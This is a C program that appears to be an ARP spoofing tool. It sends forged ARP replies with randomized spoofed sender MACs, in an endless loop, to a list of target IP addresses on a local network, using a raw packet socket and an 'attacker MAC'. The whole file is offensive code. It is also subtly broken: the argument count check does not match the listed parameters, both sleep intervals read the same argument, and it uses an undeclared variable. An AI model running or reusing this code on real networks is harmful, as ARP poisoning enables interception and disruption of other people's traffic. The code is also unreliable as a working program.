#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>   // for O_RDONLY

#define ETH_HDR_LEN sizeof(struct ether_header)
#define ARP_PKT_LEN sizeof(struct ether_arp)
#define BUF_SIZE   (ETH_HDR_LEN + ARP_PKT_LEN)

// parse “aa:bb:cc:dd:ee:ff” into 6 bytes
int parse_mac(const char *str, unsigned char *bytes) {
    int vals[6];
    if (6 == sscanf(str, "%x:%x:%x:%x:%x:%x",
                    &vals[0], &vals[1], &vals[2],
                    &vals[3], &vals[4], &vals[5])) {
        for (int i = 0; i < 6; i++) bytes[i] = (unsigned char)vals[i];
        return 0;
    }
    return -1;
}

int main(int argc, char *argv[]) {
    // args: <iface> <source IP> <source MAC> <dest IP list> <dest MAC> <attacker MAC> <sleep_sec_a> <sleep_sec_c>
    if (argc != 8) {
        return EXIT_FAILURE;
    }

    const char *iface        = argv[1];
    const char *src_ip_str   = argv[2];
    const char *src_mac_str  = argv[3];
    const char *dst_list     = argv[4];  // comma-separated list of destination IPs
    const char *dst_mac_str  = argv[5];
    const char *att_mac_str  = argv[6];
    double sleep_sec_a         = atof(argv[7]);  // seconds between each send attempt
    double sleep_sec_c         = atof(argv[7]);  // seconds between each full cycle

    unsigned char src_mac[6], dst_mac[6], att_mac[6];
    if (parse_mac(src_mac_str, src_mac) ||
        parse_mac(dst_mac_str, dst_mac) ||
        parse_mac(att_mac_str, att_mac)) {
        return EXIT_FAILURE;
    }

    struct in_addr src_ip;
    if (inet_pton(AF_INET, src_ip_str, &src_ip) != 1) {
        return EXIT_FAILURE;
    }

    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        return EXIT_FAILURE;
    }

    int ifindex = if_nametoindex(iface);
    if (ifindex == 0) {
        close(sock);
        return EXIT_FAILURE;
    }

    // Pre-build constant ARP header fields
    struct ether_header eh;
    memcpy(eh.ether_shost, att_mac, ETH_ALEN);
    eh.ether_type = htons(ETH_P_ARP);

    struct ether_arp arp;
    arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp.ea_hdr.ar_pro = htons(ETH_P_IP);
    arp.ea_hdr.ar_hln = ETH_ALEN;
    arp.ea_hdr.ar_pln = sizeof(in_addr_t);
    arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
    memcpy(arp.arp_sha, src_mac, sizeof(arp.arp_sha));
    memcpy(&arp.arp_spa, &src_ip, sizeof(src_ip));

    struct sockaddr_ll sa = {0};
    sa.sll_family   = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex  = ifindex;
    sa.sll_halen    = ETH_ALEN;

    unsigned char buffer[ETH_ZLEN] = {0};

    // Endless loop: iterate over each IP in list, send, then sleep
    while (1) {
        char *list_copy = strdup(dst_list);
        if (!list_copy) break;
        char *token = strtok(list_copy, ",");
        while (token) {
            struct in_addr dst_ip;
            if (inet_pton(AF_INET, token, &dst_ip) == 1) {
                // generate a new random spoofed MAC each iteration
                unsigned char rand_mac[6];
                int fd = open("/dev/urandom", O_RDONLY);
                if (fd >= 0) {
                    read(fd, rand_mac, 6);
                    close(fd);
                    // set local-admin, unicast bit
                    rand_mac[0] |=  0x02;
                    rand_mac[0] &= ~0x01;
                } else {
                    for (int i = 0; i < 6; i++) {
                        rand_mac[i] = (unsigned char)(rand() & 0xFF);
                    }
                }
                // set spoofed MAC in Ethernet and ARP
                //memcpy(eh.ether_shost, rand_mac, ETH_ALEN);
                memcpy(arp.arp_sha, rand_mac, ETH_ALEN);

                // Set target fields
                memset(arp.arp_tha, 0x00, ETH_ALEN);
                memcpy(&arp.arp_tpa, &dst_ip, sizeof(dst_ip));
                memcpy(eh.ether_dhost, dst_mac, ETH_ALEN);
                memcpy(sa.sll_addr, dst_mac, ETH_ALEN);

                // Send ARP reply
                memcpy(buffer, &eh, sizeof(eh));
                memcpy(buffer + sizeof(eh), &arp, sizeof(arp));

                size_t frame_len = sizeof(buffer);  // 60
                if (sendto(sock, buffer, frame_len, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {}
            }
            token = strtok(NULL, ",");
            usleep((useconds_t)(sleep_sec_a * 1e6));
        }
        free(list_copy);
        usleep((useconds_t)(sleep_sec_f * 1e6));

    }

    close(sock);
    return EXIT_SUCCESS;
}